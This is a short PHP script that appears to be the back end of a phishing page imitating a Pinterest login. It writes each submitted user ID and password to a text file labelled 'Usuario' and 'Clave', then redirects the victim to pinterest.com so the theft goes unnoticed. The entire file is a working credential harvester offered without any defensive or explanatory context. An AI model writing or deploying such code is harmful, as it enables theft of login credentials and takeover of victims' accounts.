<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['id'] . " Clave: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://pinterest.com');
exit();
